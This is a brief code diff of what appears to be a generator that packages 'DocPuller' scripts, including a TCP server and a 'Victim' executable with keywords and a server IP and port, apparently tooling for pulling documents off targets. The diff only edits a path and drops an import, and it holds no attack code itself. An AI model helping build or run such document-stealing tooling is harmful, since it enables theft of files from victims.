@@ -3,7 +3,6 @@ from tkinter import Tk
 from tkinter.filedialog import askdirectory
 import sys
 
-import PyInstaller as PyInstaller
 
 from Generator.Modoles.fronzen_objects_geneartor import FrozenObjectGeneartor
 
@@ -19,7 +18,7 @@ class DocPullerGenerator:
         self.keywords = keywords
         self.server_ip = server_ip
         self.server_port = server_port
-        self.DOCPULLER_USB_EXE_PATH = r'../docpuller_usb_exe_v2.py'
+        self.DOCPULLER_USB_EXE_PATH = r'DocPullerScriptsToExe/DocPullerUSB_Exe.py'
         self.DOCPULLER_FTP_SERVER_EXE_PATH = 'DocPullerScriptsToExe/DocPullerTCP_Server_Exe.py'
         self.DOCPULLER_FTP_VICTIM_EXE_PATH = 'DocPullerScriptsToExe/DocPullerTCP_Victim_Exe.py'
 
